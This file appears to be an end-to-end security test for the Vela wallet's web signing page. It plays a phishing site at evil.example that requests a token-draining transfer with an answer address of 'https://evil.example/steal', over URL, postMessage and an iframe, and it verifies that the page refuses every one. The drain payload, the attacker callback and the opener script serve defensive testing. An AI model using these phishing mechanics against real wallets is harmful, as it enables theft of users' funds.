// The answer goes to the Vela wallet on this device and nowhere else (spec 102
// R7) — checked on the PUBLISHED bytes, served the way the host serves them.
//
//   CHROME_BIN=… SB=… bun samples/answer-test.mjs                  the page these sources build
//   CHROME_BIN=… SB=… bun samples/answer-test.mjs --page=<sha256>   any version in dist/b/
//
// The attack, played for real. A phishing site opens the official page —
// `https://sign.getvela.app/b/<hash>/sign` — with an operation of its own
// choosing (it drains the account) and an answer address of its own
// (`cb=https://evil.example/steal`). The card describes that operation
// truthfully, on Vela's real domain; a person who slides hands a usable
// signature to evil.example. The same through postMessage (the site opens the
// page and asks), and through a frame (the site draws over the page).
//
// First the rule itself, in Node (R): the exact address, and every other
// channel and spelling refused. Then, for the page under test:
//   A. a signature answered to evil.example: no slide, no passkey prompt, the
//      card names evil.example, and evil.example receives NOTHING — not the
//      answer, not a refusal, not a beacon when the tab closes;
//   B. a signature asked over postMessage by evil.example: refused, and the
//      opener hears "refused" and never a signature;
//   C. a sign-in answered to evil.example: refused the same way;
//   D. a loopback answer address: refused — the desktop demo's exception is
//      not in the published bytes (and the harness page that carries it names
//      src/sign.html's scripts plus that one file, nothing else);
//   E. a frame: the host's headers stop it, and with no headers the page
//      itself refuses to run in one;
//   F. the real thing still works: answered to `velawallet://sign-result`,
//      the page signs, and the signature verifies under the account's key.
//
// Whenever a slide IS offered, this suite slides — what a person who trusted
// the card would do — so an old page shows what it would have given away.
//
// The host is played by this file: `sign.getvela.app` serves `dist/` with the
// rules in `dist/_headers` applied (Cloudflare Pages: every matching rule,
// same-name values joined), `getvela.app` serves this folder as files with no
// headers, and `evil.example` is the attacker.
import { spawn } from 'node:child_process';
import { createServer as createHttpServer } from 'node:http';
import { createServer as createHttpsServer } from 'node:https';
import { webcrypto } from 'node:crypto';
import { existsSync, mkdtempSync, readFileSync, rmSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { extname, join, normalize } from 'node:path';
import { Page, b64url, loadPageLibs, makeChecks, root, sleep } from './test-kit.mjs';
import { build } from './build-single.mjs';

const CDP = 9406;
const TLS_PORT = 8453;
const LOOPBACK_PORT = 8478;
const WALLET_CALLBACK = 'velawallet://sign-result';
const check = makeChecks();

const SB = process.env.SB;
if (!SB || !process.env.CHROME_BIN) throw new Error('set CHROME_BIN and SB (see HANDOVER.md)');

const DIST = join(root, 'dist');
const pageArg = process.argv.find((a) => a.startsWith('--page='));
const HASH = pageArg ? pageArg.slice('--page='.length) : build().hash;
const PUBLISHED = join(DIST, 'b', HASH, 'sign.html');
if (!/^[0-9a-f]{64}$/.test(HASH) || !existsSync(PUBLISHED)) {
  console.log(`FAILED: dist/b/${HASH}/sign.html is not there — run \`bun samples/build-single.mjs\``);
  process.exit(1);
}
const PAGE = `https://sign.getvela.app/b/${HASH}/sign`;
console.log(`page under test: ${PAGE}${pageArg ? '' : ' (what these sources build)'}\n`);

// --- the operation a phishing site would bring --------------------------------

const lib = loadPageLibs([
  'src/lib/i18n.js', 'src/lib/locales/en.js', 'src/lib/keccak.js', 'src/lib/identicon-features.js',
  'src/lib/identicon.js', 'src/lib/abi.js', 'src/lib/encode.js', 'src/lib/fee.js', 'src/lib/logos.js',
  'src/lib/catalog.js', 'src/lib/registry.js', 'src/lib/resolve.js', 'src/lib/signer.js', 'src/lib/ceremony.js',
]);
const SAFE = '0x88cCA0f8B4E1F0dC0e7C4f9a2B3d5E6f7A8b6894';
const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const ATTACKER = '0x9A8b7C6d5E4F3a2B1c0D9e8F7a6B5c4D3e2F1a09';
const drain = lib.encode.call('transfer(address,uint256)', [ATTACKER, 7654321000n]);
const userOp = {
  sender: SAFE, nonce: '0x7', initCode: '0x',
  callData: lib.encode.call('executeUserOp(address,uint256,bytes,uint8)', [USDC, 0n, drain, 0]),
  verificationGasLimit: '300000', callGasLimit: '200000', preVerificationGas: '110000',
  maxFeePerGas: '0', maxPriorityFeePerGas: '0', paymasterAndData: '0x',
};
const intent = {
  method: 'eth_sendTransaction', origin: 'https://app.uniswap.org',
  params: [{ to: USDC, value: '0x0', data: drain }],
};

// The account's key, already in the browser's vault (`rpId` getvela.app — the
// page folds sign.getvela.app to it, as the apps' passkeys are).
const pair = await webcrypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign', 'verify']);
const pkcs8 = Buffer.from(await webcrypto.subtle.exportKey('pkcs8', pair.privateKey)).toString('base64');
const rawId = Buffer.from(webcrypto.getRandomValues(new Uint8Array(16)));
const credentialId = rawId.toString('base64url');
const context = { chainId: 1, account: SAFE, allowCredentials: [credentialId], operation: { userOp } };
// Fields a requester might put in its context to pass for the wallet. The page
// overrides them with what the channel says (sign.js `show`).
const spoof = { channel: 'url', callback: WALLET_CALLBACK, originVerified: true, requester: 'https://getvela.app' };
const fragment = (request, callback, token) =>
  `#i=${b64url(JSON.stringify(request))}` + (callback ? `&cb=${b64url(callback)}` : '') + `&t=${token}`;

/** Does this callback's `result=` carry a valid signature by the account's key? */
async function usable(resultParam) {
  try {
    const result = JSON.parse(Buffer.from(resultParam, 'base64url').toString('utf8'));
    const hex = (h) => Buffer.from(String(h).replace(/^0x/, ''), 'hex');
    const clientData = hex(result.clientDataJSON);
    const hash = Buffer.from(await webcrypto.subtle.digest('SHA-256', clientData));
    const valid = await webcrypto.subtle.verify({ name: 'ECDSA', hash: 'SHA-256' }, pair.publicKey,
      hex(result.signature), Buffer.concat([hex(result.authenticatorData), hash]));
    const challenge = JSON.parse(clientData.toString('utf8')).challenge;
    return { valid, digest: result.digest, kind: result.digestKind, challenge, overDigest: !!result.digest && challenge === hex(result.digest).toString('base64url') };
  } catch (error) {
    return { valid: false, error: error.message };
  }
}

// --- the host, the attacker, and a loopback listener -------------------------

/** `dist/_headers`, as Cloudflare Pages applies it. */
function headerRules() {
  const rules = [];
  let current = null;
  for (const line of readFileSync(join(DIST, '_headers'), 'utf8').split('\n')) {
    if (!line.trim() || line.trim().startsWith('#')) continue;
    if (!/^\s/.test(line)) {
      current = { pattern: new RegExp('^' + line.trim().replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*') + '$'), headers: [] };
      rules.push(current);
    } else if (current) {
      const at = line.indexOf(':');
      current.headers.push([line.slice(0, at).trim(), line.slice(at + 1).trim()]);
    }
  }
  return (path) => {
    const out = {};
    for (const rule of rules) {
      if (!rule.pattern.test(path)) continue;
      for (const [name, value] of rule.headers) out[name] = out[name] ? `${out[name]}, ${value}` : value;
    }
    return out;
  };
}
const headersFor = headerRules();

const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8', '.json': 'application/json' };
function serveFile(res, base, path, extra = {}) {
  const file = normalize(join(base, decodeURIComponent(path)));
  if (!file.startsWith(base) || !existsSync(file) || statSync(file).isDirectory()) {
    res.writeHead(404).end();
    return;
  }
  res.writeHead(200, { 'content-type': TYPES[extname(file)] || 'application/octet-stream', ...extra });
  res.end(readFileSync(file));
}

/** Everything the attacker's host was sent, other than its own pages. */
const stolen = [];
const loopbackHits = [];

const attackerOpener = (signer) => `<!doctype html><meta charset="utf-8"><p>evil.example</p><script>
  window.__answers = [];
  window.__go = function () {
    var child = window.open(${JSON.stringify(signer)}, 'vela-signer', 'width=460,height=760');
    window.addEventListener('message', function (event) {
      var data = event.data || {};
      if (data.vela === 'ready') {
        child.postMessage({ vela: 'intent', id: 'drain-1', intent: ${JSON.stringify(intent)}, context: ${JSON.stringify(context)} }, event.origin);
      } else if (data.vela === 'result' || data.vela === 'error') {
        window.__answers.push(data);
      }
    });
    return true;
  };
</script>`;

const framing = (src) => `<!doctype html><meta charset="utf-8"><p>a page with a frame</p>
<iframe id="f" src="${src.replace(/"/g, '&quot;')}" style="width:420px;height:720px"></iframe>`;

const tls = { key: readFileSync(join(SB, 'key.pem')), cert: readFileSync(join(SB, 'cert.pem')) };
const host = createHttpsServer(tls, (req, res) => {
  const name = String(req.headers.host || '').split(':')[0];
  const url = new URL(req.url, `https://${name}`);
  if (url.pathname === '/__frame') {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }).end(framing(url.searchParams.get('src') || ''));
    return;
  }
  if (name === 'evil.example') {
    if (url.pathname === '/open') {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }).end(attackerOpener(url.searchParams.get('signer')));
      return;
    }
    if (url.pathname !== '/favicon.ico') stolen.push({ method: req.method, url: req.url });
    res.writeHead(200, { 'content-type': 'text/plain' }).end('thanks');
    return;
  }
  if (name === 'sign.getvela.app') {
    // Pretty URLs, as Pages serves them: `/b/<hash>/sign` is `sign.html`.
    const path = url.pathname.endsWith('/sign') ? `${url.pathname}.html` : url.pathname;
    serveFile(res, DIST, path, headersFor(url.pathname));
    return;
  }
  serveFile(res, root, url.pathname);
});
await new Promise((r) => host.listen(TLS_PORT, '127.0.0.1', r));

const loopback = createHttpServer((req, res) => {
  if (!req.url.startsWith('/favicon')) loopbackHits.push({ method: req.method, url: req.url });
  res.writeHead(200).end('ok');
});
await new Promise((r) => loopback.listen(LOOPBACK_PORT, '127.0.0.1', r));

// --- the browser ----------------------------------------------------------------

const profile = mkdtempSync(join(tmpdir(), 'answer-'));
const rules = ['sign.getvela.app', 'getvela.app', 'evil.example'].map((h) => `MAP ${h}:443 127.0.0.1:${TLS_PORT}`).join(', ');
const chrome = spawn(process.env.CHROME_BIN, [
  '--headless=new', `--remote-debugging-port=${CDP}`, `--user-data-dir=${profile}`,
  `--host-resolver-rules=${rules}`, '--ignore-certificate-errors', '--no-proxy-server',
  '--no-first-run', '--no-default-browser-check', 'about:blank',
], { stdio: 'ignore' });
for (let i = 0; i < 80; i++) {
  try { await (await fetch(`http://127.0.0.1:${CDP}/json/version`)).json(); break; } catch { await sleep(250); }
}

// Counts every passkey prompt the page raises: a refusal must come before one.
const COUNT_WEBAUTHN = `(() => {
  window.__webauthnCalls = 0;
  const c = navigator.credentials;
  const get = c.get.bind(c), create = c.create.bind(c);
  c.get = (o) => { window.__webauthnCalls++; return get(o); };
  c.create = (o) => { window.__webauthnCalls++; return create(o); };
})();`;

/** The account's key in this tab's vault; returns how to read its use count. */
async function addKey(page) {
  const authenticatorId = await page.addAuthenticator();
  await page.send('WebAuthn.addCredential', {
    authenticatorId,
    credential: {
      credentialId: rawId.toString('base64'), isResidentCredential: true, rpId: 'getvela.app',
      privateKey: pkcs8, userHandle: Buffer.from('vela-answer-test').toString('base64'), signCount: 0,
    },
  });
  return async () => {
    const { credentials } = await page.send('WebAuthn.getCredentials', { authenticatorId });
    return credentials.reduce((n, c) => n + c.signCount, 0);
  };
}

/** A tab that counts passkey prompts and records every navigation it asks for. */
async function tab(url) {
  const page = await Page.open(CDP, 'about:blank');
  page.navigations = [];
  page.ws.addEventListener('message', (event) => {
    const message = JSON.parse(event.data);
    if (message.method === 'Page.frameRequestedNavigation') page.navigations.push(message.params.url);
  });
  await page.send('Page.enable');
  await page.send('Page.addScriptToEvaluateOnNewDocument', { source: COUNT_WEBAUTHN });
  page.uses = await addKey(page);
  await page.navigate(url);
  await page.waitFor("window.__velaState && ['card', 'refused', 'answered', 'framed'].includes(window.__velaState.phase)");
  return page;
}

/** What a person who trusted the card would do: slide, if a slide is offered. */
async function slideIfOffered(page) {
  const offered = await page.ev('!!window.__slider');
  if (offered) await page.ev('window.__slider.__confirm()', true);
  return offered;
}

async function describeStolen(entries) {
  const lines = [];
  for (const entry of entries) {
    const result = new URL(entry.url, 'https://evil.example').searchParams.get('result');
    if (!result) { lines.push(`${entry.method} ${entry.url.slice(0, 60)}`); continue; }
    const sig = await usable(result);
    lines.push(`${entry.method} ${entry.url.slice(0, 48)}… — ` + (sig.valid
      ? `a VALID signature by the account's key over ${sig.kind} ${String(sig.digest).slice(0, 18)}…`
      : `not a valid signature (${sig.error || 'bad'})`));
  }
  return lines.join(' | ');
}

// === R. the rule, in Node =======================================================
{
  const signature = { method: 'personal_sign', params: ['0x68656c6c6f', SAFE], origin: 'https://app.example' };
  const r7 = (ctx) => {
    const view = lib.resolve(signature, { account: SAFE, chainId: 1, ...ctx });
    const w = view.warnings.find((x) => x.key === 'refuse.answerElsewhere' || x.key === 'refuse.answerNotToWallet');
    return { refused: view.refuse === true, key: w && w.key, to: w && w.params && w.params.to };
  };
  const ok = r7({ channel: 'url', callback: WALLET_CALLBACK });
  check('R. velawallet://sign-result on the url channel: the answer reaches the wallet', !ok.refused && !ok.key);
  for (const [callback, to] of [
    ['https://evil.example/steal', 'evil.example'],
    ['http://127.0.0.1:8477/vela', '127.0.0.1:8477'],
    ['velawallet://open?url=https%3A%2F%2Fevil.example%2F', 'velawallet://open'],
    ['velawallet://sign-result?x=1', 'velawallet://sign-result'],
    ['VELAWALLET://sign-result', 'velawallet://sign-result'],
    ['evilwallet://sign-result', 'evilwallet://sign-result'],
  ]) {
    const got = r7({ channel: 'url', callback });
    check(`R. ${callback}: refused, naming ${to}`, got.refused && got.key === 'refuse.answerElsewhere' && got.to === to,
      JSON.stringify(got));
  }
  for (const [what, ctx] of [
    ['no answer address', { channel: 'url' }],
    ['the loopback socket', { channel: 'ws', callback: WALLET_CALLBACK }],
    ['no channel at all', { callback: WALLET_CALLBACK }],
  ]) {
    const got = r7(ctx);
    check(`R. ${what}: refused`, got.refused && got.key === 'refuse.answerNotToWallet', JSON.stringify(got));
  }
  const post = r7({ channel: 'post', originVerified: true, requester: 'https://wallet.getvela.app' });
  check('R. postMessage, even from a Vela origin: refused, naming the opener',
    post.refused && post.key === 'refuse.answerElsewhere' && post.to === 'wallet.getvela.app', JSON.stringify(post));

  const signIn = (ctx) => lib.resolve({ method: 'vela_signIn', params: [{}], origin: '' }, { rpId: 'getvela.app', ...ctx });
  const home = signIn({ channel: 'url', callback: WALLET_CALLBACK });
  const away = signIn({ channel: 'url', callback: 'https://evil.example/steal' });
  check('R. a sign-in on the url channel: offered when it answers the wallet, refused when it does not',
    !home.refuse && away.refuse === true && away.warnings.some((w) => w.key === 'refuse.ceremonyNotForWallet'));
}

try {
  // === A. a signature answered to the attacker =================================
  //
  // Its context even claims to be the wallet's own channel; the page takes
  // the channel's word over the requester's.
  {
    const before = stolen.length;
    const page = await tab(`${PAGE}?ch=url&lang=en${fragment({ intent, context: { ...context, ...spoof } }, 'https://evil.example/steal', 'tok-a')}`);
    const slid = await slideIfOffered(page);
    await sleep(slid ? 3000 : 600);
    check('A. answered to evil.example: no slide is offered', !slid);
    const said = String(await page.ev("[...document.querySelectorAll('.warning-text')].map((n) => n.textContent).join(' | ') || document.body.innerText"));
    check('A. the card says it will not sign, and names where the answer would have gone',
      /sends a signature only to the Vela wallet/.test(said) && said.includes('evil.example'),
      said.replace(/\n/g, ' / ').slice(0, 170));
    check('A. no passkey prompt was raised', (await page.ev('window.__webauthnCalls')) === 0 && (await page.uses()) === 0,
      `prompts=${await page.ev('window.__webauthnCalls')} key uses=${await page.uses()}`);
    await page.close();
    await sleep(1200); // a closing tab's beacon would have arrived by now
    const got = stolen.slice(before);
    check('A. evil.example received nothing — no answer, no refusal, not even when the tab closed',
      got.length === 0, got.length ? await describeStolen(got) : '');
  }

  // === B. the same operation, asked over postMessage ============================
  {
    const opener = await Page.open(CDP, `https://evil.example/open?signer=${encodeURIComponent(`${PAGE}?ch=post&lang=en`)}`);
    await opener.waitFor('!!window.__go');
    await opener.ev('window.__go()', true);
    const popup = await Page.find(CDP, (u) => u.includes('/sign?ch=post'));
    const uses = await addKey(popup);
    await popup.waitFor("window.__velaState && ['card', 'refused'].includes(window.__velaState.phase)");
    const slid = await slideIfOffered(popup);
    await opener.waitFor('window.__answers.length > 0', slid ? 8000 : 4000);
    const answers = await opener.ev('window.__answers');
    check('B. asked over postMessage by evil.example: no slide is offered', !slid);
    check('B. the opener heard "refused", and never a signature',
      answers.length === 1 && answers[0].vela === 'error' && answers[0].code === 'refused',
      answers.map((a) => a.vela === 'result'
        ? `evil.example got a signature over ${a.result.digestKind} ${String(a.result.digest).slice(0, 18)}…`
        : `${a.vela}:${a.code}`).join(' | '));
    check('B. no passkey prompt was raised', (await uses()) === 0, `key uses=${await uses()}`);
    await popup.close();
    await opener.close();
  }

  // === C. a sign-in answered to the attacker ====================================
  {
    const before = stolen.length;
    const signIn = { intent: { method: 'vela_signIn', params: [{}], origin: '' }, context: { walletName: 'Mine' } };
    const page = await tab(`${PAGE}?ch=url&lang=en${fragment(signIn, 'https://evil.example/steal', 'tok-c')}`);
    const slid = await slideIfOffered(page);
    await sleep(slid ? 3000 : 600);
    check('C. a sign-in answered to evil.example: refused before any prompt',
      !slid && (await page.ev('window.__webauthnCalls')) === 0);
    await page.close();
    await sleep(1200);
    const got = stolen.slice(before);
    check('C. and evil.example received nothing', got.length === 0, got.map((e) => `${e.method} ${e.url.slice(0, 60)}`).join(' | '));
  }

  // === D. a loopback answer address ===========================================
  {
    const before = loopbackHits.length;
    const page = await tab(`${PAGE}?ch=url&lang=en${fragment({ intent, context }, `http://127.0.0.1:${LOOPBACK_PORT}/vela`, 'tok-d')}`);
    const slid = await slideIfOffered(page);
    await sleep(slid ? 3000 : 600);
    await page.close();
    await sleep(1200);
    check('D. a loopback answer address is refused by the published page, and nothing reaches it',
      !slid && loopbackHits.length === before, `slid=${slid} hits=${loopbackHits.length - before}`);

    const html = readFileSync(PUBLISHED, 'utf8');
    const harnessCode = existsSync(join(root, 'samples/loopback-answer.js'));
    check('D. the published bytes do not contain the harness exception',
      harnessCode && !html.includes('loopback-answer') && !html.includes('var strict = ns.resolve.answersToWallet'));

    // The harness page is src/sign.html plus that one file, so what the demo
    // tests is the real page and nothing else.
    const scripts = (file) => [...readFileSync(join(root, file), 'utf8').matchAll(/<script\s+src="([^"]+)"\s*><\/script>/g)].map((m) => m[1]);
    const harnessPage = join(root, 'samples/loopback-sign.html');
    const expected = scripts('src/sign.html').map((s) => `../src/${s}`);
    expected.splice(expected.indexOf('../src/sign.js'), 0, 'loopback-answer.js');
    const actual = existsSync(harnessPage) ? scripts('samples/loopback-sign.html') : [];
    check('D. the harness page names src/sign.html\'s scripts plus loopback-answer.js, nothing else',
      JSON.stringify(actual) === JSON.stringify(expected), existsSync(harnessPage) ? '' : 'samples/loopback-sign.html is missing');

    // …and the harness page does answer its loopback listener, or the demo
    // would be testing nothing.
    if (existsSync(harnessPage)) {
      const harness = await tab(`https://getvela.app/samples/loopback-sign.html?ch=url&lang=en${fragment({ intent, context }, `http://127.0.0.1:${LOOPBACK_PORT}/vela`, 'tok-h')}`);
      const offered = await slideIfOffered(harness);
      for (let i = 0; i < 40 && loopbackHits.length === before; i++) await sleep(200);
      const hit = loopbackHits.slice(before).find((h) => h.url.startsWith('/vela?t=tok-h&result='));
      check('D. the harness page (test only) answers its loopback listener',
        offered && !!hit && (await usable(new URL(hit.url, 'http://x').searchParams.get('result'))).valid);
      await harness.close();
    }
  }

  // === E. frames ================================================================
  {
    const signer = `${PAGE}?ch=url&lang=en${fragment({ intent, context }, WALLET_CALLBACK, 'tok-e')}`;
    const frame = await Page.open(CDP, `https://evil.example/__frame?src=${encodeURIComponent(signer)}`);
    await sleep(2500);
    // A cross-origin frame is a target of its own. DevTools lists it under the
    // URL it was asked for even when the browser refused to show it, so look
    // inside: a refused frame holds the browser's error page.
    const targets = await (await fetch(`http://127.0.0.1:${CDP}/json/list`)).json();
    const iframe = targets.find((t) => t.type === 'iframe' && t.url.startsWith('https://sign.getvela.app/'));
    let shown = '(no frame target)';
    if (iframe && iframe.webSocketDebuggerUrl) {
      const child = await Page.attach(iframe.webSocketDebuggerUrl, CDP);
      shown = await child.ev("location.href + ' · ' + (window.__velaState ? window.__velaState.phase : '-')");
    }
    const headers = headersFor(`/b/${HASH}/sign`);
    check('E. the host sends frame-ancestors \'none\' and X-Frame-Options: DENY for the page',
      /frame-ancestors 'none'/.test(headers['Content-Security-Policy'] || '') && headers['X-Frame-Options'] === 'DENY',
      JSON.stringify(headers));
    check('E. so evil.example cannot frame it: the frame holds the browser\'s error page, not the signer',
      !!iframe && shown.startsWith('chrome-error://'), shown.slice(0, 100));
    await frame.close();

    // A host that sends no headers (a copy served from anywhere): the page
    // itself refuses. Same origin here, so the frame can be read.
    const bare = `/dist/b/${HASH}/sign.html?ch=url&lang=en${fragment({ intent, context }, WALLET_CALLBACK, 'tok-f')}`;
    const parent = await Page.open(CDP, `https://getvela.app/__frame?src=${encodeURIComponent(bare)}`);
    await parent.waitFor("(() => { const w = document.getElementById('f').contentWindow; return !!(w && w.__velaState && w.__velaState.phase !== 'starting'); })()");
    await sleep(800);
    const inside = await parent.ev(`(() => {
      const w = document.getElementById('f').contentWindow;
      return { phase: w.__velaState.phase, received: w.__velaState.received,
        sheet: !!w.document.querySelector('.sheet'), slider: !!w.__slider,
        status: (w.document.getElementById('status') || {}).textContent || '' };
    })()`);
    check('E. with no headers, the page refuses to run inside a frame: no request read, no card, no slide',
      inside.phase === 'framed' && inside.received === 0 && !inside.sheet && !inside.slider,
      JSON.stringify(inside).slice(0, 160));
    await parent.close();
  }

  // === F. the real thing still works ===========================================
  {
    const before = stolen.length;
    const page = await tab(`${PAGE}?ch=url&lang=en${fragment({ intent, context }, WALLET_CALLBACK, 'tok-ok')}`);
    const offered = await slideIfOffered(page);
    for (let i = 0; i < 40 && !page.navigations.some((u) => u.startsWith(WALLET_CALLBACK)); i++) await sleep(200);
    const answer = page.navigations.find((u) => u.startsWith(`${WALLET_CALLBACK}?t=tok-ok&result=`));
    const sig = answer ? await usable(new URL(answer).searchParams.get('result')) : { valid: false };
    check('F. answered to velawallet://sign-result, the slide is offered and the page answers there',
      offered && !!answer, answer ? answer.slice(0, 60) + '…' : page.navigations.join(' | ').slice(0, 120));
    check('F. and the answer is the account\'s signature over the SafeOp the card showed',
      sig.valid && sig.kind === 'SafeOp' && sig.overDigest, `${sig.kind} ${String(sig.digest).slice(0, 18)}…`);
    check('F. evil.example heard nothing along the way', stolen.length === before);
    await page.close();
  }
} catch (error) {
  console.log('FAILED: ' + (error.stack || error.message));
  check.results.push(false);
} finally {
  chrome.kill();
  host.close();
  loopback.close();
  try { rmSync(profile, { recursive: true, force: true }); } catch { /* ignore */ }
}
process.exit(check.summary() ? 0 : 1);
